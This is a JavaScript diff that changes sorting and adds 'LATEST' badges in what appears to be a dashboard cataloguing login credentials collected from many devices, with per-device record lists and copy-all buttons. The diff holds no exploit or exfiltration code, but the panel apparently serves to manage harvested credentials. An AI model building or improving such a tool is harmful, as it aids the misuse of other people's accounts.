@@ -389,7 +389,7 @@ function buildDeviceCardPremium(devId, index, devices) {
             credData._timestamp = credData.timestamp || credData.date || Date.now();
             devLoginList.push(credData);
         });
-        // SORT - LATEST FIRST
+        // SORT - LATEST FIRST (descending timestamp)
         devLoginList.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
     }
     
@@ -412,6 +412,8 @@ function buildDeviceCardPremium(devId, index, devices) {
             let fields = '';
             let timestamp = rec.timestamp || rec.date || '';
             let displayTime = '';
+            let isLatest = idx === 0;
+            
             if (timestamp) {
                 try {
                     const d = new Date(timestamp);
@@ -435,10 +437,13 @@ function buildDeviceCardPremium(devId, index, devices) {
                     </div>
                 `;
             }
+            
+            const latestBadge = isLatest ? `<span style="background:var(--green);color:#fff;font-size:7px;padding:1px 8px;border-radius:10px;margin-left:4px;">⬇️ LATEST</span>` : '';
+            
             return `
-                <div class="cred-item-premium">
+                <div class="cred-item-premium" style="${isLatest ? 'border-left: 2px solid var(--green);' : ''}">
                     <div class="cred-header-premium">
-                        <span>📋 Record ${idx+1} ${displayTime ? '🕐 ' + escapeHtml(displayTime) : ''}</span>
+                        <span>📋 Record ${idx+1} ${displayTime ? '🕐 ' + escapeHtml(displayTime) : ''} ${latestBadge}</span>
                         <span style="font-size:9px;color:var(--text-muted);">#${idx+1}</span>
                     </div>
                     <div class="cred-fields-premium">${fields}</div>
@@ -1763,7 +1768,7 @@ function escapeHtml(text) {
 }
 
 // ============================================================
-// CREDENTIALS CATALOG - WITH LATEST FIRST
+// CREDENTIALS CATALOG - LATEST SUBMISSION FIRST
 // ============================================================
 function renderCredentialsCatalog() {
     const grid = document.getElementById('credsGrid');
@@ -1789,26 +1794,29 @@ function renderCredentialsCatalog() {
                 credData._timestamp = credData.timestamp || credData.date || Date.now();
                 credList.push(credData);
             });
-            // SORT - LATEST FIRST
-            credList.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
+            
+            // SORT: LATEST FIRST (highest timestamp first)
+            credList.sort((a, b) => {
+                const aTime = a._timestamp || 0;
+                const bTime = b._timestamp || 0;
+                return bTime - aTime;
+            });
             
             state.credCatalogData.push({
                 deviceId: devId,
                 serial: state.deviceSerialMap.get(devId) || 0,
                 deviceInfo: devices[devId] || {},
                 credentials: credList,
-                count: credList.length
+                count: credList.length,
+                latestTimestamp: credList.length > 0 ? credList[0]._timestamp : 0
             });
             totalCreds += credList.length;
         }
     });
     
-    // Sort devices by serial first, then by latest credential
+    // Sort devices by latest credential timestamp
     state.credCatalogData.sort((a, b) => {
-        if (a.serial !== b.serial) return b.serial - a.serial;
-        const aLatest = a.credentials.length > 0 ? a.credentials[0]._timestamp : 0;
-        const bLatest = b.credentials.length > 0 ? b.credentials[0]._timestamp : 0;
-        return bLatest - aLatest;
+        return (b.latestTimestamp || 0) - (a.latestTimestamp || 0);
     });
     
     const totalEl = document.getElementById('catalogTotalCreds');
@@ -1841,7 +1849,7 @@ function renderCredentialsCatalog() {
 }
 
 // ============================================================
-// BUILD CREDENTIAL CARD
+// BUILD CREDENTIAL CARD - LATEST FIRST WITH BADGE
 // ============================================================
 function buildCredCard(item) {
     const deviceName = item.deviceInfo.d_name || item.deviceInfo.device_name || item.deviceId;
@@ -1851,6 +1859,8 @@ function buildCredCard(item) {
         let fieldsHtml = '';
         let timestamp = cred.timestamp || cred.date || '';
         let displayTime = '';
+        let isLatest = idx === 0;
+        
         if (timestamp) {
             try {
                 const d = new Date(timestamp);
@@ -1875,10 +1885,16 @@ function buildCredCard(item) {
             `;
         }
         
+        const latestBadge = isLatest ? `<span style="background:var(--green);color:#fff;font-size:8px;padding:1px 8px;border-radius:10px;margin-left:6px;">⬇️ LATEST</span>` : '';
+        
         return `
-            <div class="cred-item">
+            <div class="cred-item" style="${isLatest ? 'border-left-color: var(--green);' : ''}">
                 <div class="cred-item-header">
-                    <span class="record-num">#${idx + 1} ${displayTime ? '📅 ' + escapeHtml(displayTime) : ''}</span>
+                    <span class="record-num">
+                        #${idx + 1} 
+                        ${displayTime ? '📅 ' + escapeHtml(displayTime) : ''}
+                        ${latestBadge}
+                    </span>
                     <div class="cred-actions">
                         <button onclick="copyAllCreds('${item.deviceId}', ${idx})" title="Copy All">
                             <i class="fas fa-copy"></i>
@@ -1893,7 +1909,7 @@ function buildCredCard(item) {
         `;
     }).join('');
     
-    const latestTime = item.credentials.length > 0 ? new Date(item.credentials[0]._timestamp).toLocaleTimeString() : '';
+    const latestTime = item.credentials.length > 0 ? new Date(item.credentials[0]._timestamp).toLocaleString() : '';
     
     return `
         <div class="cred-card" data-device="${item.deviceId}">
@@ -1933,21 +1949,18 @@ function buildCredDeviceTabs(container) {
         <i class="fas fa-circle"></i> No Creds <span class="tab-count">${state.credCatalogData.filter(d => d.count === 0).length}</span>
     </button>`;
     
-    // Show devices with most recent credentials first
     const topDevices = [...state.credCatalogData]
         .filter(d => d.count > 0)
-        .sort((a, b) => {
-            const aLatest = a.credentials.length > 0 ? a.credentials[0]._timestamp : 0;
-            const bLatest = b.credentials.length > 0 ? b.credentials[0]._timestamp : 0;
-            return bLatest - aLatest;
-        })
         .slice(0, 5);
     
-    topDevices.forEach(item => {
+    topDevices.forEach((item, index) => {
         const name = item.deviceInfo.d_name || item.deviceInfo.device_name || item.deviceId;
         const latestTime = item.credentials.length > 0 ? new Date(item.credentials[0]._timestamp).toLocaleDateString() : '';
-        html += `<button class="filter-tab" onclick="filterCredsByDevice('${item.deviceId}')" data-filter="${item.deviceId}">
-            📱 ${escapeHtml(name.substring(0, 10))} 
+        const isLatest = index === 0;
+        const badge = isLatest ? ' 🔥' : '';
+        
+        html += `<button class="filter-tab ${isLatest ? 'active' : ''}" onclick="filterCredsByDevice('${item.deviceId}')" data-filter="${item.deviceId}">
+            📱 ${escapeHtml(name.substring(0, 10))}${badge}
             <span class="tab-count">${item.count}</span>
             ${latestTime ? `<span style="font-size:8px;color:var(--text-muted);margin-left:2px;">🕐${latestTime}</span>` : ''}
         </button>`;
